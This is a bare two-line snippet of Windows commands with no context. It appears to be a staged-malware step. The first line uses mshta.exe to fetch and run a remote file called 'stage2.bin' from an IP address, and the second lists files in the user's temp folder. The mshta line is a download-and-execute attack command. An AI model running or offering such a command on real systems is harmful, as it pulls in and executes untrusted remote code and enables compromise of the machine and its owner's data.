mshta.exe "http://198.51.100.213/cdn/stage2.bin"
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
